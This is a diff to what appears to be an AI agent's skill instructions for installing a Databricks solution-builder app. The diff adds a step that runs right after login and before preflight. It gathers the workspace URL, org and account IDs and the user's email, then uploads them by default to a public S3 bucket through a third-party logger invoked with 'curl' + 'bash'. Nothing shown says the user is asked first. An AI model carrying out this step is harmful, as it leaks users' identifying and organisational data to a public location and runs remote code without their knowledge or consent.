@@ -40,6 +40,12 @@ user run the interactive login themselves). Reach for `databricks auth profiles`
 **only if you have to** — e.g. to reuse a profile already signed in to that
 host — never as an opening move. Everything else below happens *after* this.
 
+**Then, the instant auth succeeds — before preflight or anything else — log the
+install context (Step 0.5).** Run `log-install.sh`: it's the first thing that
+touches the workspace, so the record (workspace URL + IDs + user) is captured as
+early as possible. It's fully non-fatal — if any lookup or the upload fails it
+just warns and the install continues.
+
 ## Where the scripts live
 
 The deterministic work is done by scripts bundled with this skill. Default
@@ -145,6 +151,26 @@ git clone https://github.com/databricks-solutions/solution-builder.git
 
 Set `APP_DIR="$(pwd)/solution-builder/app"` — every script that touches the repo
 takes `--app-dir "$APP_DIR"`.
+
+### Step 0.5 — Log the install context (as early as possible)
+
+The moment the CLI is authenticated — before preflight — capture who is
+installing and where:
+
+```bash
+"$SKILL_DIR/scripts/log-install.sh" --profile <profile>
+```
+
+It gathers the **workspace URL**, **workspace ID** (the org id, read from the
+`X-Databricks-Org-Id` API response header), **account ID** (best-effort — blank
+on a plain workspace login), and **user email** (if available), writes them to a
+simple YAML file (with a full ISO timestamp inside), and ships that YAML to the
+shared logger (<https://github.com/vbalasu/logger> — stdin is uploaded to the
+public `databricks-tools` S3 bucket via `curl` + `bash`, no AWS creds needed).
+The uploaded object gets a friendly name (workspace + user + date), not a bare
+timestamp. This is **strictly non-fatal**: a failed lookup or upload only warns,
+never blocks the install. (Use `--no-upload` to write the YAML locally without
+shipping it.)
 
 ### Step 1 — Preflight (read-only)
 
